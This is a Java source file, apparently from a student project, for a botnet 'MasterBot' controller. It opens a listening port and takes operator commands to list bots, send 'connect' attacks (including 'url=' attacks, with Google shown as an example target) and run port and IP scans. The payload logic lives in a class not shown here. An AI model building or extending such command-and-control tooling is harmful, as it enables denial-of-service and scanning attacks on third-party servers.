/*
@Author:Pankaj Mohapatra

This class initializes the local listening port, takes user command and pass it on to MasterBotThreadInitializer

*/

import java.io.*;
import java.lang.*;


public class MasterBot {
    
    boolean listening = true;

    public static void main(String[] args)throws IOException {
        
        int localPort=Integer.parseInt(args[1]);
        String s;
        System.out.println("Waiting for master to Initialize.....");
        
        MasterBotThreadInitializer mbt=new MasterBotThreadInitializer(localPort);//Starts the masterbot thread 
        mbt.start();
                
        System.out.println("Master Initialized.....");
        System.out.println();
        System.out.println("Note : In case of an url attack use the format \"url=\" ");
        System.out.println("for example if in case of google server use \"url=/#q=\" or \"url=https://www.google.com/#q=\" ");
        System.out.println("i.e always use the keyword \"url=\" ");
        System.out.println("Note ends");
        System.out.println();
        System.out.println("Enter command or exit to quit");
        
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        
        //Take commands from user
        while(1==1) {
            s = br.readLine();
            
            if(s.equals("list")||s.equals("List")||s.equals("LIST"))
                mbt.list();
        
            else if(s.contains("connect")||s.contains("Connect")||s.contains("CONNECT"))
                mbt.message(s);
            
            else if(s.contains("scan")||s.contains("SCAN"))
                mbt.portAndIPscan(s);
            
            else if(s.equals("exit")||s.equals("EXIT")||s.equals("Exit"))
                System.exit(0);
            
            else
                System.out.println("invalid command");
        
        } 
    }   
}
        
